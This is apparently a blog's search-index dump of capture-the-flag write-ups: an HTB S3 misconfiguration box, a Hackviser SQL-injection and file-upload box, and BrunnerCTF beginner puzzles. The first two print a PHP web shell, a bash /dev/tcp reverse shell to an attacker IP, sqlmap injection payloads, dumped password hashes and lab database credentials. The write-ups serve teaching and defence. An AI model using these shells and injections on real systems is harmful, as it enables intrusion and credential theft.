2025","externalUrl":null,"permalink":"/tags/aws-s3/","section":"Tags","summary":"","title":"Aws S3","type":"tags"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/categories/awscli/","section":"Categories","summary":"","title":"Awscli","type":"categories"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/tags/awscli/","section":"Tags","summary":"","title":"Awscli","type":"tags"},{"content":" Three # Description # Three is a Linux machine hosting a website that uses an AWS S3 bucket as its cloud storage.\nThe bucket is misconfigured, allowing us to upload a malicious file.\nBy executing this file through the website, we can gain remote access to the system and retrieve the flag.\nEnumeration # Step 1: Scanning the Target for Open Ports # Start with a full port scan to identify services running on the machine:\nnmap -sV -p- 10.129.227.248 -T4 Output:\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Findings:\nPort 22 (SSH) is open. Port 80 (HTTP) is hosting a website. Step 2: Exploring the Website # Visit the site in your browser using the target IP on port 80. Check the Contact section and note the email address: mail@thetoppers.htb Since the domain thetoppers.htb is being used, map it to the target IP in your /etc/hosts file: echo \u0026#34;10.129.227.248 thetoppers.htb\u0026#34; | sudo tee -a /etc/hosts Tip: /etc/hosts lets you manually link a domain name to an IP address so your computer can access the site without DNS.\nStep 3: Enumerating Subdomains # Use ffuf to brute-force possible subdomains:\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\ -u http://thetoppers.htb \\ -H \u0026#34;Host: FUZZ.thetoppers.htb\u0026#34; \\ -ac Result:\ns3.thetoppers.htb Map this subdomain as well:\necho \u0026#34;10.129.227.248 s3.thetoppers.htb\u0026#34; | sudo tee -a /etc/hosts Visit it in the browser or via curl:\ncurl http://s3.thetoppers.htb Output:\n{\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;} This indicates that the site is using an Amazon S3-like storage service.\nWhat is Amazon S3? Amazon Simple Storage Service (S3) is a cloud service that stores files. A misconfigured S3 bucket can allow unauthorized reading, writing, or deleting of files.\nConfiguring and Interacting with the S3 Bucket # Step 4: Setting Up AWS CLI # Install and configure the AWS CLI if you haven\u0026rsquo;t already:\naws configure Use temporary placeholder values since authentication is not enforced:\nAWS Access Key ID [None]: temp AWS Secret Access Key [None]: temp Default region name [None]: temp Default output format [None]: temp Step 5: Listing Buckets and Files # List all available buckets:\naws --endpoint=http://s3.thetoppers.htb s3 ls List files inside the bucket:\naws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb Exploiting the S3 Bucket # Step 6: Uploading a Web Shell # Create a simple PHP shell locally:\necho \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; \u0026gt; shell.php Upload the shell:\naws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb Visit the uploaded file to test command execution:\nhttp://thetoppers.htb/shell.php?cmd=whoami Output:\nwww-data This confirms that you can run commands on the server.\nStep 7: Setting Up a Reverse Shell # Create a reverse shell script locally (change 10.10.16.2 to your attacker IP):\necho \u0026#39;#!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/1234 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; shell.sh Upload the script:\naws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb Set up a listener on your machine:\nnc -lvnp 1234 Trigger the reverse shell by visiting:\nhttp://thetoppers.htb/shell.php?cmd=bash%20shell.sh Output:\nlistening on [any] 1234 ... connect to [10.10.16.2] from (UNKNOWN) [10.129.227.248] 44028 bash: no job control in this shell www-data@three:/var/www/html$ Post-Exploitation # Step 8: Finding the Flag # Once connected, look for the flag:\nlocate flag.txt Output:\n/var/www/flag.txt Read the flag:\ncat /var/www/flag.txt Blue Team Notes # The root cause is a publicly writable S3 bucket.\nTo prevent such issues:\nRestrict bucket permissions to only trusted IAM users. Disable public access unless explicitly required. Monitor bucket activity logs for unusual operations. Key Takeaways # Misconfigured S3 buckets are a common attack vector. Always enumerate subdomains when testing web applications. Gaining command execution can often lead to a reverse shell for deeper access. ","date":"28 August 2025","externalUrl":null,"permalink":"/posts/2025-08-28-three/2025-08-28-three/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eThree \n    \u003cdiv id=\"three\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#three\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eDescription \n    \u003cdiv id=\"description\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#description\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eThree\u003c/strong\u003e is a Linux machine hosting a website that uses an \u003cstrong\u003eAWS S3 bucket\u003c/strong\u003e as its cloud storage.\u003cbr\u003e\nThe bucket is misconfigured, allowing us to upload a malicious file.\u003cbr\u003e\nBy executing this file through the website, we can gain remote access to the system and retrieve the flag.\u003c/p\u003e","title":"Three","type":"posts"},{"content":" Challenge Description # This warmup machine focuses on teaching how to exploit the SQL Injection vulnerability, which causes database exploits, and the File Upload vulnerability, which causes malicious files to be uploaded to the server.\nIt is recommended for practicing how to discover and exploit SQL Injection and File Upload vulnerabilities.\nEnumeration # Scanning for open ports using NMAP:\nnmap -T4 -sV 172.20.29.74 --open Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 19:05 EDT Nmap scan report for dashboard.innovifyai.hackviser (172.20.29.74) Host is up (0.035s latency). Not shown: 515 filtered tcp ports (no-response), 483 closed tcp ports (reset) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.56 ((Debian)) 3306/tcp open mysql MySQL (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds Notice that we have 2 ports open on the target:\n80/tcp Running HTTP service 3306/tcp Running MySQL service Assessing the web application # Visiting the web service running on port 80, we can clearly see that its a static website. We also can note that there is a button to a login page, however, we cant access the page. We need to add the entry to our /etc/hosts file:\necho \u0026#34;172.20.29.74 dashboard.innovifyai.hackviser\u0026#34; | sudo tee -a /etc/hosts That then leads us to the login page. However, we don\u0026rsquo;t have any credentials to work with here. I decided, to test the website for vulnerabilities like SQLi using SQLMap. I first intercepted a login request to the website using burpsuite and save the request to a file. It looked like this:\ncat login.req POST /login_process.php HTTP/1.1 Host: dashboard.innovifyai.hackviser Content-Length: 51 Cache-Control: max-age=0 Accept-Language: en-US,en;q=0.9 Origin: http://dashboard.innovifyai.hackviser Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://dashboard.innovifyai.hackviser/login.php Accept-Encoding: gzip, deflate, br Cookie: PHPSESSID=fprtmbvnohkn8g0ushe30m9cq7 Connection: keep-alive email=info%40innovifyai.hackviser\u0026amp;password=password Notice that I used dummy credentials. I then used this request with SQLMap and discovered that the website is vulnerable to SQL injection. Specifically through the email field. This is the command I used:\nsqlmap -r login.req --dbs The output was long, but was summarized in this log:\ncat log sqlmap identified the following injection point(s) with a total of 316 HTTP(s) requests: --- Parameter: email (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment) Payload: email=info@innovifyai.hackviser\u0026#39; AND 2625=(SELECT (CASE WHEN (2625=2625) THEN 2625 ELSE (SELECT 5063 UNION SELECT 7394) END))-- -\u0026amp;password=password Type: error-based Title: MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: email=info@innovifyai.hackviser\u0026#39; AND GTID_SUBSET(CONCAT(0x7171707871,(SELECT (ELT(4159=4159,1))),0x716a766a71),4159) AND \u0026#39;iHvX\u0026#39;=\u0026#39;iHvX\u0026amp;password=password Type: stacked queries Title: MySQL \u0026gt;= 5.0.12 stacked queries (comment) Payload: email=info@innovifyai.hackviser\u0026#39;;SELECT SLEEP(5)#\u0026amp;password=password Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: email=info@innovifyai.hackviser\u0026#39; AND (SELECT 8247 FROM (SELECT(SLEEP(5)))jLIE) AND \u0026#39;ZBLV\u0026#39;=\u0026#39;ZBLV\u0026amp;password=password --- Assessing the Underlying SQL database # Now that we know that the target webpage is vulnerable to SQLi, let\u0026rsquo;s try and and enumerate the database further. We\u0026rsquo;ll start by obtaining info about the database by running:\nsqlmap -r login.req --dbs That then gives us some important info:\n--- web server operating system: Linux Debian web application technology: Apache 2.4.56 back-end DBMS: MySQL \u0026gt;= 5.6 available databases [5]: [*] information_schema [*] innovifyai [*] mysql [*] performance_schema [*] sys sqlmap resumed the following injection point(s) from stored session: --- One of the important databases we need to assess is the innovifyai database. Let\u0026rsquo;s do that:\nsqlmap -r login.req -D innovifyai --tables More info is availed to us about the tables available in that database:\n--- web server operating system: Linux Debian web application technology: Apache 2.4.56 back-end DBMS: MySQL \u0026gt;= 5.6 Database: innovifyai [4 tables] +-----------+ | customers | | employees | | orders | | users | +-----------+ sqlmap resumed the following injection point(s) from stored session: --- Let\u0026rsquo;s go ahead and further assess the users table:\nsqlmap -r login.req -D innovifyai -T users --dump ====================SNIP======================== Database: innovifyai Table: users [2 entries] +----+---------------------+--------------+---------+----------------------------------+---------------+ | id | email | name | isAdmin | password | profile_image | +----+---------------------+--------------+---------+----------------------------------+---------------+ | 1 | sparrow@sparrow.com | Jack Sparrow | 1 | e50c41905bb09fd6fe7fd2bdae06c5b6 | \u0026lt;blank\u0026gt; | | 2 | ragetti@ragetti.com | Ragetti | 1 | e266762ee74709dcdac67e593387cad1 | \u0026lt;blank\u0026gt; | +----+---------------------+--------------+---------+----------------------------------+---------------+ I then went ahead and cracked the first hash using crackstation.net and managed to login into the website with the credentials sparrow@sparrow.com:sp4rr0w.\nNotice that this user is an admin user. When I visited the settings page, I saw a place where a user can set their image via an upload functionality. However, I wondered where the image would go after that and decided to bruteforce the website for hidded pages using FFUF:\nffuf -ac -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dashboard.innovifyai.hackviser/FUZZ -recursion -recursion-depth 4 -e .php, .html, .txt I discovered an /upload directory that we could easily access. This means, we could possibly try and upload a PHP reverse shell script to the target and try and execute it while listening in for a connection on our attack machine.\nThe upload worked, you can confirm that by visiting http://dashboard.innovifyai.hackviser/uploads/.\nObtaining a Shell # Let\u0026rsquo;s set a listener for an incoming connection from the target before executing the script:\nnc -lvnp 1234 listening on [any] 1234 ... connect to [10.8.46.15] from (UNKNOWN) [172.20.29.74] 57298 Linux bee 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux 19:52:20 up 1:55, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $ pwd / As shown above, we manage to get a shell as www-data user. When we look around we can find even more interesting file like this one with root credentials to the database:\n$ cat /var/www/dashboard.innovifyai.hackviser/db_connect.php \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;Root.123!hackviser\u0026#34;; $database = \u0026#34;innovifyai\u0026#34;; try { $conn = new PDO(\u0026#34;mysql:host=$servername;dbname=$database\u0026#34;, $username, $password); $conn-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); } catch (PDOException $e) { die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } ?\u0026gt;$ ","date":"24 August 2025","externalUrl":null,"permalink":"/posts/2025-08-26-bee.md/2025-08-26-bee/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003eChallenge Description \n    \u003cdiv id=\"challenge-description\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#challenge-description\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eThis warmup machine focuses on teaching how to exploit the SQL Injection vulnerability, which causes database exploits, and the File Upload vulnerability, which causes malicious files to be uploaded to the server.\u003c/p\u003e\n\u003cp\u003eIt is recommended for practicing how to discover and exploit SQL Injection and File Upload vulnerabilities.\u003c/p\u003e\n\n\u003ch2 class=\"relative group\"\u003eEnumeration \n    \u003cdiv id=\"enumeration\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#enumeration\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eScanning for open ports using NMAP:\u003c/p\u003e","title":"Bee","type":"posts"},{"content":" Cooking Flags with BrunnerCTF 2025 - A Beginnerâ€™s Feast # Get your aprons on and terminals ready - the BrunnerCTF has just served up its very first edition, and I couldnâ€™t resist grabbing a plate! ðŸ½ï¸\nThis CTF brought a flavorful mix of challenges, from web and OSINT to forensics, crypto, reverse engineering, and even some pwn and boot2root fun. While there were plenty of spicy dishes for the seasoned pros, I stuck to the â€œShake \u0026amp; Bakeâ€ menu - a perfect selection of beginner-friendly challenges designed to teach and entertain.\nIn this post, Iâ€™ll walk you through my journey solving most of the beginner tasks across categories like misc, OSINT, web, crypto, forensics, boot2root, pwn, and reverse engineering. Along the way, Iâ€™ll share my thought process, lessons learned, and tips you can use if youâ€™re just getting started with CTFs.\nSanity Check - misc # I found this flag by just reading the challenge description\u0026hellip; Here is a snip from the last part of that challenge description:\nLet\u0026#39;s Go! Before you move on, please read the rules of the CTF carefully. They contain important notes on what you\u0026#39;re allowed to and not. Then, submit the following flag: `brunner{n0w-y0u-kn0w-y0ur-C-T-F}` Based Brunner - misc # This was the challenge description: The zip file attached to the challenge had the following highlighted files: The based.txt file had long lines of binary code. This was the content of the encode.py file:\ndef encode_char(ch: str, base: int) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34; Encode a single character into a string of digits in the given base \u0026#34;\u0026#34;\u0026#34; value = ord(ch) digits = [] while value \u0026gt; 0: digits.append(str(value % base)) value //= base return \u0026#34;\u0026#34;.join(reversed(digits)) with open(\u0026#34;flag.txt\u0026#34;) as f: text = f.read().strip() # Encode the text with all bases from decimal to binary for base in range(10, 1, -1): text = \u0026#34; \u0026#34;.join(encode_char(ch, base) for ch in text) with open(\u0026#34;based.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(text) Understand the Encoding # The provided script encode.py converts the flag into different number bases, starting from base 10 down to base 2:\nfor base in range(10, 1, -1): text = \u0026#34; \u0026#34;.join(encode_char(ch, base) for ch in text) First, each character is turned into a number (ord(ch) gives the ASCII number).\nThen, itâ€™s converted into base 10, then base 9, then base 8, and so onâ€¦ until base 2.\nAt every step, numbers are joined with spaces.\nExample of encoding a single letter:\n\u0026lsquo;A\u0026rsquo; â†\u0026rsquo; 65 (base 10) 65 â†\u0026rsquo; 71 (base 9) 71 â†\u0026rsquo; 105 (base 8) \u0026hellip; eventually a string of 1s and 0s for base 2.\nPlan for Decoding # To reverse the encoding, just reverse the steps:\nStart from base 2, go up layer by layer until base 10. Convert each group back to integers, then to characters, at each step. The Decoder Script # Hereâ€™s the script that worked:\ndef decode_layer(encoded_text, base): \u0026#34;\u0026#34;\u0026#34;Decode one layer of the encoding for a given base.\u0026#34;\u0026#34;\u0026#34; decoded_chars = [] for chunk in encoded_text.split(): decoded_chars.append(chr(int(chunk, base))) return \u0026#34;\u0026#34;.join(decoded_chars) with open(\u0026#34;based.txt\u0026#34;) as f: text = f.read().strip() # Reverse the encoding: base 2 â†\u0026#39; base 10 for base in range(2, 11): text = decode_layer(text, base) print(\u0026#34;Flag:\u0026#34;, text) How It Works # split() breaks the string by spaces to isolate each encoded character. int(chunk, base) converts that chunk from the current base to an integer. chr() converts the integer to the corresponding ASCII character. Loop from base 2 up to 10, one layer at a time. Flag: brunner{1s_b4s3d}\nThe Baking Case - misc # We\u0026rsquo;re given the text:\ni UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN\u0026#39;T rIsE My OVeN haS fEWeR CRasHEs tHaN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn\u0026#39;t reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings The phrase â€œbit by bitâ€ is the key hint: think binary. The oddly mixed upper/lower casing suggests a case-stego scheme (uppercase to 1, lowercase to 0). ChatGPT was able to come up with a script to decode this:\ntext = (\u0026#34;i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear \u0026#34; \u0026#34;THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt \u0026#34; \u0026#34;oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO \u0026#34; \u0026#34;sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN\u0026#39;T rIsE My OVeN haS fEWeR CRasHEs tHaN \u0026#34; \u0026#34;mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS \u0026#34; \u0026#34;ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh \u0026#34; \u0026#34;MY cInnAmON rOLLs aND paNICkED WHEn I coUldn\u0026#39;t reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe \u0026#34; \u0026#34;yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings\u0026#34;) # 1) Keep letters only letters = [c for c in text if c.isalpha()] # 2) Map case -\u0026gt; bits (lower=0, upper=1) bits = \u0026#39;\u0026#39;.join(\u0026#39;1\u0026#39; if c.isupper() else \u0026#39;0\u0026#39; for c in letters) # 3) Chop into bytes bytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)] bytes8 = [b for b in bytes8 if len(b) == 8] # drop incomplete trailing bits # 4) ASCII decode decoded = \u0026#39;\u0026#39;.join(chr(int(b, 2)) for b in bytes8) print(decoded) The script is looking for a hidden message in the weirdly capitalized paragraph. It does this by turning capital and lowercase letters into binary (1s and 0s), grouping them into bytes, and then decoding those bytes into text.\nTo keep only letters: letters = [c for c in text if c.isalpha()]\nThe script removes everything thatâ€™s not a letter (like spaces or punctuation).\nSo \u0026ldquo;i UseD to coDE\u0026hellip;\u0026rdquo; becomes a long string like: \u0026ldquo;iUseDtocoDEliKe\u0026hellip;\u0026rdquo;\nIt then turns letter casing into binary (0s and 1s) bits = ''.join('1' if c.isupper() else '0' for c in letters)\nEvery uppercase letter â†\u0026rsquo; 1\nEvery lowercase letter â†\u0026rsquo; 0\nExample:\n\u0026ldquo;iUseD\u0026rdquo; â†\u0026rsquo; \u0026ldquo;0 1 0 1 1\u0026rdquo;\nAt this point, the script has a very long chain of binary digits (1s and 0s).\nIt then goes ahead to group into chunks of 8 bits (bytes)\nbytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)] bytes8 = [b for b in bytes8 if len(b) == 8] Computers read text in bytes â€\u0026quot; groups of 8 bits.\nThis step splits the binary string into 8-bit groups.\nAny extra bits at the end that donâ€™t make a full byte are thrown away.\nExample:\n\u0026ldquo;01000001 01100010 01100011 \u0026hellip;\u0026rdquo;\nThen it decodes binary into text\ndecoded = \u0026#39;\u0026#39;.join(chr(int(b, 2)) for b in bytes8) print(decoded) Each 8-bit binary number is converted into its ASCII character.\n\u0026ldquo;01000001\u0026rdquo; â†\u0026rsquo; A \u0026ldquo;01100010\u0026rdquo; â†\u0026rsquo; b \u0026ldquo;01100011\u0026rdquo; â†\u0026rsquo; c This reveals the hidden message. When I saved and ran the script, it outputted this: Flag: brunner{I_like_Baking_More_That_Programming}\nShaken, Not Stirred - crypto # Challenge Description # The challenge gave a fun story: After all that cake, it\u0026rsquo;s time for a drink ðŸ¸. But wait, the bartender added a strange â€œsecret ingredient.â€ Can we figure out what it is? We were also provided with some scrambled text: and a Python script that performed the encryption.\nLooking at the Code # Hereâ€™s the core part of the script that does the â€œmixingâ€:\nshaker = 0 for ingredient in ingredients: shaker ^= len(ingredient) * random.randrange(18) with open(\u0026#34;flag.txt\u0026#34;, \u0026#34;rb\u0026#34;) as f: secret = f.read().strip() drink = bytes([b ^ shaker for b in secret]) Breaking this down:\nshaker starts at 0. For each ingredient, the script:\nTakes the length of the ingredient string. Multiplies it by a random number between 0 and 17. XORs (^=) the result with the current shaker value. Finally, every byte of the flag is XORed with the shaker value to produce the ciphertext.\nKey Observations # XOR encryption is being used.\nThe shaker (key) is just a number.\nEven though random.randrange(18) is called, thereâ€™s no seed specified. But importantly, the final key will always be a number between 0 and 255 because of how XOR works with bytes.\nSo, if we donâ€™t know the key - brute-forcing all 256 possibilities is quick and easy.\nBrute-forcing the Key # Hereâ€™s the brute-force script I used: When running it, the readable candidate that stood out was: And just like that - we have the flag!\nThe Flag # brunner{th3_n4m3's_Brunn3r...J4m3s_Brunn3r}\nThere Is a Lovely Land - osint # There was a challenge description with a zip file attached to it that when extracted had an image: I downloaded the file and extracted it to find this image: I used the image to do a reverse image search on google and found a hit for visual matches with the name of the bridge: I found a hit. So I submitted the flag: brunner{storebÃ¦ltsbroen}\nTrain Mania - osint # Description # I recently stumpled upon this cool train! But I\u0026rsquo;d like to know a bit more about it\u0026hellip; Can you please tell me the operating company, model number and its maximum service speed (km/h in regular traffic)?\nThe flag format is brunner{OPERATOR-MODELNUMBER-SERVICESPEED}. So if the operator you have found is DSB, the model number RB1, and the maximum service speed is 173 km/h, the flag would be brunner{DSB-RB1-173}.\nA zip file was attached to this challenge and it had a video, I played it and paused it almost at the end as I had noticed something unique about the train, a logo: Once again I did a reverse image search with google and saw this: So I start searching for that specific model of the train online and find some sources with good info:\nhttps://en.wikipedia.org/wiki/X_2000 https://www.railvolution.net/news/sj-class-x2000-modernisation-progress I used that info to assemble the flag: brunner{SJ-X2-200}\nDoughBot - forensics # This was the challenge description: We were given a zip file to download, which I downloaded and unzipped then tried to understand the kind of file this was and it turned out to be a windows initialization file. I then read its contents and saw what looked like an encoded flag: I then copied the encoded string and tried to identify the cipher used: Turns out, this was a base64 string, I proceeded to cyberchef to decode it: Flag: brunner{m1x3d_s1gnals_4_sure}\nThe Secret Brunsviger - forensics # Here is the challenge description: The ZIP file provided, contained two files, traffic.pcap file and another file called keys.log. I opened the PCAP file with wireshark and tried to follow the traffic from one of the packets and it was all encrypted and therefore couldnt see anything to work with.\nI then decided to try and use the other file as the key to decrypt the traffic. To do that I followed these steps:\nGo to Edit â†' Preferences â†' Protocols â†' TLS Set (Pre)-Master-Secret log filename to the path of keys.log This has partly been illustrated below: Once the key is loaded, I proceeded to apply a filter for HTTP traffic and follow the traffic once again from one of the packets: It looked like a conversation among chefs, that led to this: This looks like an encoded flag. Let\u0026rsquo;s decode it from CyberChef: Flag: brunner{S3cr3t_Brunzv1g3r_R3c1p3_Fr0m_Gr4ndm4s_C00kb00k}\nOnline Cake Flavour Shop - pwn # This was the challenge description: We were given an instance to connect to and a file to download. The file had some code in C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define FLAG_COST 100 #define BRUNNER_COST 10 #define CHOCOLATE_COST 7 #define DRÃ˜MMEKAGE_COST 5 int buy(int balance, int price) { int qty; printf(\u0026#34;How many? \u0026#34;); scanf(\u0026#34;%u\u0026#34;, \u0026amp;qty); int cost = qty * price; printf(\u0026#34;price for your purchase: %d\\n\u0026#34;, cost); if (cost \u0026lt;= balance) { balance -= cost; printf(\u0026#34;You bought %d for $%d. Remaining: $%d\\n\u0026#34;, qty, cost, balance); } else { printf(\u0026#34;You can\u0026#39;t afford that!\\n\u0026#34;); } return balance; } void menu() { printf(\u0026#34;\\nMenu:\\n\u0026#34;); printf(\u0026#34;1. Sample cake flavours\\n\u0026#34;); printf(\u0026#34;2. Check balance\\n\u0026#34;); printf(\u0026#34;3. Exit\\n\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); } unsigned int flavourMenu(unsigned int balance) { unsigned int updatedBalance = balance; printf(\u0026#34;\\nWhich flavour would you like to sample?:\\n\u0026#34;); printf(\u0026#34;1. Brunner ($%d)\\n\u0026#34;, BRUNNER_COST); printf(\u0026#34;2. Chocolate ($%d)\\n\u0026#34;, CHOCOLATE_COST); printf(\u0026#34;3. DrÃ¸mmekage ($%d)\\n\u0026#34;, DRÃ˜MMEKAGE_COST); printf(\u0026#34;4. Flag Flavour ($%d)\\n\u0026#34;, FLAG_COST); printf(\u0026#34;\u0026gt; \u0026#34;); int choice; scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); switch (choice) { case 1: updatedBalance = buy(balance, BRUNNER_COST); break; case 2: updatedBalance = buy(balance, CHOCOLATE_COST); break; case 3: updatedBalance = buy(balance, DRÃ˜MMEKAGE_COST); break; case 4: unsigned int flagBalance; updatedBalance = buy(balance, FLAG_COST); if (updatedBalance \u0026gt;= FLAG_COST) { // Open file and print flag FILE *fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if(!fp) { printf(\u0026#34;Could not open flag file, please contact admin!\\n\u0026#34;); exit(1); } char file[256]; size_t readBytes = fread(file, 1, sizeof(file), fp); puts(file); } break; default: printf(\u0026#34;Invalid choice.\\n\u0026#34;); break; } return updatedBalance; } int main() { int balance = 15; int choice; printf(\u0026#34;Welcome to Overflowing Delights!\\n\u0026#34;); printf(\u0026#34;You have $%d.\\n\u0026#34;, balance); while (1) { menu(); scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); switch (choice) { case 1: balance = flavourMenu(balance); break; case 2: printf(\u0026#34;You have $%d.\\n\u0026#34;, balance); break; case 3: printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); break; default: printf(\u0026#34;Invalid choice.\\n\u0026#34;); break; } } return 0; } The scenario # You have an online cake shop program. You start with $15:\nYou can â€œsampleâ€ different cake flavours:\nBrunner ($10)\nChocolate ($7)\nDrÃ¸mmekage ($5)\nFlag Flavour ($100) â€\u0026quot; this is what we want.\nThe program asks how many of a flavour you want to buy, calculates the total cost, and checks if you can afford it.\nSpot the vulnerability # Hereâ€™s the key code from shop.c:\nint buy(int balance, int price) { unsigned int qty; scanf(\u0026#34;%u\u0026#34;, \u0026amp;qty); // user enters quantity int cost = qty * price; // calculate total cost if (cost \u0026lt;= balance) { ... } return balance - cost; } Observations # qty is unsigned int (cannot be negative, very large possible values)\ncost is signed int (can be negative or positive)\nbalance is signed int\nThis combination can lead to an integer overflow.\nWhat is integer overflow? # Think of integers in C as containers with a maximum size. For a 32-bit signed integer:\nMax value = 2,147,483,647 Min value = -2,147,483,648 If you calculate a number larger than 2,147,483,647, it wraps around and becomes negative.\nExample: 2,147,483,648 â†\u0026rsquo; -2,147,483,648 This is like an odometer rolling over.\nHow I exploited it # I wanted to buy the Flag Flavour ($100), but our balance is only $15.\nStep 1: Enter a very large quantity for the flag: qty = 21,474,837\nStep 2: Calculate cost:\ncost = qty * 100 cost = 21,474,837 * 100 cost = 2,147,483,700 â†\u0026rsquo; overflow â†\u0026rsquo; -2,147,483,596 Step 3: Updated balance:\nupdatedBalance = balance - cost updatedBalance = 15 - (-2,147,483,596) updatedBalance = 2,147,483,611 Now updatedBalance \u0026gt; FLAG_COST, so the program thinks you can afford the flag and prints it!\nFlag: brunner{wh0_kn3w_int3g3rs_c0uld_m4k3_y0u_rich}\nDat Overflow Dough - pwn # Challenge Link: ncat 